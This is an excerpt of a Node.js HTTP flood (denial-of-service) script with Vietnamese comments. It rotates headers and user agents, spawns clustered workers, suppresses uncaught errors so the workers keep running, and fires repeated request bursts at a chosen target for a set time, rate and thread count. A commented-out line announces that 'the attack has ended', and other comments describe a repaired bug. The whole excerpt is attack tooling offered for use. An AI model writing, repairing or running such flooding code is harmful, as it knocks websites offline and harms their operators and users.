...
// Đoi tuong chua cac header ngau nhien
const randomHeaders = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
};

// Ham đe lay header ngau nhien
const headerFunc = {
...
process.on('uncaughtException', function (exception) {
    // Bo qua loi khong xac đinh đe giu cho worker tiep tuc chay
});
...
if (blackList.some(site => args.target.includes(site))) {
  console.log("Trang web nay nam trong danh sach đen.".red);
  process.exit(1);
}

if (args.time <= 0 || args.time > 300) {
  console.log("Thoi gian toi đa la 300 giay.".red);
  process.exit(1);
}

if (args.Rate <= 0 || args.Rate > 1024) {
  console.log("Rate toi đa la 1024.".red);
  process.exit(1);
}

if (args.threads <= 0 || args.threads > 256) {
  console.log("So luong toi đa la 256.".red);
  process.exit(1);
}
...
if (cluster.isMaster) {
    ...
    setTimeout(() => {
        // console.log('Tan cong đa ket thuc.'.green);
        process.exit(1);
    }, args.time * 1000);
...
function getRandomUserAgent() {
    ...
    // --- LOI ĐA ĐUOC SUA ---
    // Thay the btoa bang Buffer.from(...).toString('base64') vi btoa khong ton tai trong Node.js
    const encryptedString = Buffer.from(userAgentString).toString('base64');
    
    // Phan ma hoa them nay co the khong can thiet, nhung van giu lai logic goc
    let finalString = '';
    ...
    return userAgentString; // Tra ve user-agent that se hieu qua hon
}
            ...
            setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    ...
                    request.on("response", response => {
                        // console.log("Response status:", response[':status']); // Bo comment đe debug
                        request.close();
                        request.destroy();
                    });
                    request.end();
